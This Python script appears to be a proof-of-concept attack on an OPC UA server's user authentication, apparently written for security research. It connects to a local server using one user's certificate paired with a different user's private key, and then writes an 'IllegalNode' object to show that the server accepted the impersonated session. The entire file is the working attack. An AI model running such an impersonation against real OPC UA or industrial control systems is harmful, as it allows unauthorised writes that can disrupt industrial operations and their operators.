import asyncio
import logging
import sys
import socket
from pathlib import Path

sys.path.insert(0, "venv/kci-user-impersonation-attacker")
from asyncua import Client
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
from asyncua import ua


logging.basicConfig(level=logging.INFO)
_logger = logging.getLogger(__name__)

USE_TRUST_STORE = True

# Client's certificate and private key
cert_base = Path(__file__).parent
cert = Path(cert_base / f"attacker_client_cert.der")
private_key = Path(cert_base / f"attacker_client_key.der")

# Attacker doesn't know user 1's PK
user1_cert = Path(cert_base / f"user-certificates/user1-cert.der")
user2_private_key = Path(cert_base / f"user-certificates/user2.pem")

async def task(loop):
    host_name = socket.gethostname()
    client_app_uri = f"urn:open62541.unconfigured.application"
    url = "opc.tcp://admin@127.0.0.1:4840/freeopcua/server/"


    # Create client and set security policies
    client = Client(url=url)
    client.application_uri = client_app_uri
    await client.set_security(
        SecurityPolicyBasic256Sha256,
        certificate=str(cert),
        private_key=str(private_key),
        server_certificate = Path(cert_base / f"client-truststore/server.der")
    )

    # Attacker knows certificate, but doesn't know user 1's private key
    await client.load_client_certificate(user1_cert, extension="der")

    # Simulates pk of a different user
    await client.load_private_key(user2_private_key, extension="pem")

    # Open channel, create session and read from/write to nodes
    try:
        async with client:
            # Random request, doesn't matter what it is - just to show it was processed
            objects = client.nodes.objects
            obj = await objects.add_object(1, "IllegalNode")
            try:
                child = await objects.get_child(["1:IllegalNode"])
                print("Object now exists:", child)
            except ua.Error:
                print("No Match Found")

    except ua.UaError as exp:
        _logger.error(exp)

def main():
    loop = asyncio.get_event_loop()
    loop.set_debug(True)
    loop.run_until_complete(task(loop))
    loop.close()

if __name__ == "__main__":
    main()
